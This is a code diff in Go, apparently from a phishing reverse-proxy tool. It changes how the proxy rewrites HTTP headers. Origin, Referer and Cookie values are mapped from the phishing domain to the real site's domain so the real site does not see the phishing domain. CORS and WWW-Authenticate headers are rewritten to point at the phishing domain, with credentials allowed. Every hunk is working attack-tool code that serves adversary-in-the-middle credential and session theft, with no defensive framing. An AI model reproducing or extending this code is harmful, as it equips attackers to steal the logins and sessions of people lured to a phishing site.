@@ -163,35 +163,35 @@ func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {
 	httpRequest.Host = httpRequest.URL.Host
 
 	// Patch HTTP Origin:
-	origin := ""
-	if p.Origin != "" {
-		origin = runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(p.Origin, runtime.PhishURLToRealURL)
-
-		if origin != "" {
-			log.Debugf("Patching request Origin [%s] -> [%s]", p.Origin, origin)
-			httpRequest.Header.Set("Origin", origin)
+	if len(httpRequest.Header["Origin"]) > 0 {
+		for i, oldOrigin := range httpRequest.Header["Origin"] {
+			newOrigin := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(oldOrigin, runtime.PhishURLToRealURL)
+			log.Debugf("Patching request Origin [%s] -> [%s]", oldOrigin, newOrigin)
+			httpRequest.Header["Origin"][i] = newOrigin
 		}
 	}
 
 	// Patch HTTP Referer:
 	// Prevent phish domain leakage via referer
-	if httpRequest.Referer() != "" {
-		newReferer := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Referer(), runtime.PhishURLToRealURL)
-		httpRequest.Header.Set("Referer", newReferer)
-
-		log.Debugf("Patching request Referer [%s] -> [%s]", httpRequest.Referer(), newReferer)
+	if len(httpRequest.Header["Referer"]) > 0 {
+		for i, oldReferer := range httpRequest.Header["Referer"] {
+			newReferer := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(oldReferer, runtime.PhishURLToRealURL)
+			log.Debugf("Patching request Referer [%s] -> [%s]", oldReferer, newReferer)
+			httpRequest.Header["Referer"][i] = newReferer
+		}
 	}
 
 	// Patch Cookies:
 	// Prevent phish domain leakage via cookies
-	if httpRequest.Header.Get("Cookie") != "" {
-		cookie := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Header.Get("Cookie"), runtime.PhishURLToRealURL)
-		if runtime.TrackingCookie != "" {
-			cookie = runtime.RegexpCookieTracking.ReplaceAllString(cookie, "")
+	if len(httpRequest.Header["Cookie"]) > 0 {
+		for i, oldCookie := range httpRequest.Header["Cookie"] {
+			cookie := runtime.RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(oldCookie, runtime.PhishURLToRealURL)
+			if runtime.TrackingCookie != "" {
+				cookie = runtime.RegexpCookieTracking.ReplaceAllString(cookie, "")
+			}
+			log.Debugf("Patching request Cookies [%s] -> [%s]", oldCookie, cookie)
+			httpRequest.Header["Cookie"][i] = cookie
 		}
-		log.Debugf("Patching request Cookies [%s] -> [%s]", httpRequest.Header.Get("Cookie"), cookie)
-		httpRequest.Header.Set("Cookie", cookie)
-
 	}
 
 	return
@@ -202,15 +202,25 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPResponse")
 
 	// Patch HTTP Origin:
-	if p.Origin != "" {
-		// if httpResponse.Header.Get("Access-Control-Allow-Origin") == "*" {
-		// 	p.Origin = "*"
-		// }
-
+	if len(httpResponse.Header["Access-Control-Allow-Origin"]) > 0 {
+		setCredentials := false
+		for i, oldOrigin := range httpResponse.Header["Access-Control-Allow-Origin"] {
+			if oldOrigin == "*" || oldOrigin == "null" {
+				log.Debugf("Not rewriting Access-Control-Allow-Origin: [%s]", oldOrigin)
+			} else {
+				newOrigin := runtime.RegexpUrl.ReplaceAllStringFunc(oldOrigin, runtime.RealURLtoPhish)
+				log.Debugf("Rewriting Access-Control-Allow-Origin: from \n[%s]\n --> \n[%s]\n", oldOrigin, newOrigin)
+				httpResponse.Header["Access-Control-Allow-Origin"][i] = newOrigin
+				setCredentials = true
+			}
+		}
+		if setCredentials {
+			httpResponse.Header.Set("Access-Control-Allow-Credentials", "true")
+		}
+	} else if p.Origin != "" {
 		httpResponse.Header.Set("Access-Control-Allow-Origin", p.Origin)
 		httpResponse.Header.Set("Access-Control-Allow-Credentials", "true")
-
-		log.Debugf("[rw] Patching Response Origin [%s] -> [%s]", httpResponse.Header.Get("Access-Control-Allow-Origin"), p.Origin)
+		log.Debugf("[rw] Forcing Response Origin -> [%s]", p.Origin)
 	}
 
 	// Strip security HTTP headers
@@ -268,10 +278,11 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 
 	// Patch WWW-Authenticate:
 	if len(httpResponse.Header["WWW-Authenticate"]) > 0 {
-		oldAuth := httpResponse.Header.Get("WWW-Authenticate")
-		newAuth := runtime.RegexpUrl.ReplaceAllStringFunc(oldAuth, runtime.RealURLtoPhish)
-		log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
-		httpResponse.Header.Set("WWW-Authenticate", newAuth)
+		for i, oldAuth := range httpResponse.Header["WWW-Authenticate"] {
+			newAuth := runtime.RegexpUrl.ReplaceAllStringFunc(oldAuth, runtime.RealURLtoPhish)
+			log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
+			httpResponse.Header["WWW-Authenticate"][i] = newAuth
+		}
 	}
 
 	// ---- Handle 302 redirects ----
